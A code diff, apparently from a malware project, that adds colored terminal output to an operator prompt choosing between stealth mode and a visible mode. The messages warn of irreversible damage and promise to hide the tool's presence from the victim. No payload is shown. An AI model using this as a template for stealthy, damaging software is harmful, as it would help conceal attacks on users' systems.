@@ -64,21 +64,21 @@ bool Infection::askForNoStealthMode(){
 			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
 				std::string confirm{""};
 				system("clear");
-				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : \n");
+				printf("\033[1;31m[+] Are you sure you want to continue ? (The damage caused by the malware are not reversable) : \033[0m\n");
 				printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
 				std::cin >> confirm;
 				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
 					system("clear");
-					printf("[+] Stealth Mode Disabled, the user will clearly notice that something happens to his system but i will try to obfuscate our presence the most as possible !\n");
+					printf("\033[1;32m[+] Stealth Mode Disabled, the user will clearly notice that something happens to his system but i will try to obfuscate our presence the most as possible !\033[0m\n");
 					return stealthEnabled = false;
 				} else if(confirm == "NO" || confirm == "no" || confirm == "n" || confirm == "N") {
 					system("clear");
-					printf("[+] Stealth Mode Enabled, *shhhhhh*\n");
+					printf("\033[1;32m[+] Stealth Mode Enabled, *shhhhhh*\n\033[0m");
 					return stealthEnabled = true;
 				}		
 			} else if(answer2StealthMode == "NO" || answer2StealthMode == "no" || answer2StealthMode == "n" || answer2StealthMode == "N"){
 				system("clear");
-				printf("[+] Stealth Mode Enabled, *shhhhhh*\n");
+				printf("\033[1;32m[+] Stealth Mode Enabled, *shhhhhh*\n\033[0m");
 				return stealthEnabled = true;
 			}		
 		}
